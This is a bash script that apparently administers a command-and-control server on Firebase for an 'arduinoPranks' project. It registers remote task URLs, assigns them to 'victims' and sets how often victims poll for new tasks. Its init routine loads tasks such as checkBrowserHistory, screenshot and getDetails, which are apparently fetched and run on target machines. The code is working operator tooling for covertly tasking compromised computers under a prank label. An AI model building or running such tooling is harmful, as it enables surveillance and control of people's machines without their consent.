#!/usr/bin/env bash

SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )

source "$SCRIPTDIR/deploy"

###############################################################################

function usage(){

  echo "config <option> [parameters]"
  echo "  addTask <taskID> <taskURL>"
  echo "  delTask <taskID>"
  echo "  listTasks"
  echo "  listVictims"
  echo "  setVictimTask <victim> <taskID>"
  echo "  getVictimTask <victim>"
  echo "  init"
  echo "  setIterationLength <length>"
  echo "  getIterationLength"
  echo ""
}

###############################################################################

function addTask(){
  local taskID="$1"
  local taskURL="$2"

  if [ -z "$1" ] || [ -z "$2" ]; then
    usage
    exit 1
  fi

  local completeTaskURL="${payloadPrefix}${taskURL}"
  if [ ! `urlExists "$completeTaskURL"` -eq 0 ]; then
    echo "Error: Specified task '$completeTaskURL' does not exist"
  else
    curl -X PUT -d "\"$taskURL\"" "https://${firebaseProject}.firebaseio.com/tasks/$taskID.json" &>/dev/null
  fi
}

###############################################################################

function delTask(){
  local taskID="$1"

  if [ -z "$1" ]; then
    usage
    exit 1
  fi
  curl -X DELETE "https://${firebaseProject}.firebaseio.com/tasks/$taskID.json" &>/dev/null
}

###############################################################################

function listTasks() {
  echo "Available tasks"
  curl -s "https://${firebaseProject}.firebaseio.com/tasks.json" \
   | tr ',' '\n' \
   | tr -d '{}' \
   | sed -e 's/^/  /'
  echo ""
}

###############################################################################

function getTaskURL() {
  local taskID="$1"
  local url=`curl -s "https://${firebaseProject}.firebaseio.com/tasks/$taskID.json" | tr -d '"'`

  if [ "$url" == "null" ]; then
    echo ""
  else
    echo $url
  fi
}

function setVictimTask() {
  local victim="$1"
  local taskID="$2"

  if [ -z "$1" ] || [ -z "$2" ]; then
    usage
    exit 1
  fi

  local taskURL="`getTaskURL $taskID`"
  if [ -z "$taskURL" ]; then
    echo "Error: Specified task '$taskID' does not exist"
  else
    curl -X PUT -d "\"$taskID\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json" &>/dev/null
  fi
}

###############################################################################

function listVictims() {

  echo "Not implemented yet!"

}

###############################################################################

function getIterationLength() {

  local length=`curl -s "https://${firebaseProject}.firebaseio.com/iterationLength.json"`


  if [ ! -z "$length" ] && [ $length -eq $length ]; then
    echo "$length"
  else
    echo "60"
  fi
}

function setIterationLength() {
  local length="$1"

  if [ ! -z "$length" ] && [ $length -eq $length ] 2>/dev/null; then
    curl -s -X PUT -d "$length" "https://${firebaseProject}.firebaseio.com/iterationLength.json"  > /dev/null
  else
    usage
    exit 1
  fi
}

###############################################################################

function getVictimTask() {
  local victim="$1"

  if [ -z "$1" ]; then
    usage
    exit 1
  fi

  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json"
  echo ""
}

###############################################################################

function initialize() {

  addTask default arduinoPranks/master/websiteReactionPrank/task.getDetails
  addTask getDetails arduinoPranks/master/websiteReactionPrank/task.getDetails
  addTask checkBrowserHistory arduinoPranks/master/websiteReactionPrank/task.checkBrowserHistory
  addTask sleep arduinoPranks/master/websiteReactionPrank/task.sleep
  addTask status arduinoPranks/master/websiteReactionPrank/task.status
  addTask prototype arduinoPranks/master/websiteReactionPrank/task.prototype
  addTask _removePrank_ arduinoPranks/master/websiteReactionPrank/task.removePrank

  addTask cycle1 arduinoPranks/master/websiteReactionPrank/task.cycle1
  addTask cycle2 arduinoPranks/master/websiteReactionPrank/task.cycle2

  addTask screenshot arduinoPranks/master/websiteReactionPrank/task.screenshot
  addTask binaural_knock arduinoPranks/master/websiteReactionPrank/task.binaural_knock

  curl -X PUT -d "60" "https://${firebaseProject}.firebaseio.com/iterationLength.json"
}

###############################################################################

func=`echo "$1" | tr '[:upper:]' '[:lower:]'`

case "$func" in
  setvictimtask)
    setVictimTask "$2" "$3"
    ;;
  getvictimtask)
    getVictimTask "$2"
    ;;
  addtask)
    addTask "$2" "$3"
    ;;
  deltask)
    delTask "$2"
    ;;
  listvictims)
    listVictims
    ;;
  listtasks)
    listTasks
    ;;
  setiterationlength)
    setIterationLength "$2"
    ;;
  getiterationlength)
    getIterationLength
    ;;
  init)
    initialize
    ;;
  *)
    usage
    ;;
esac


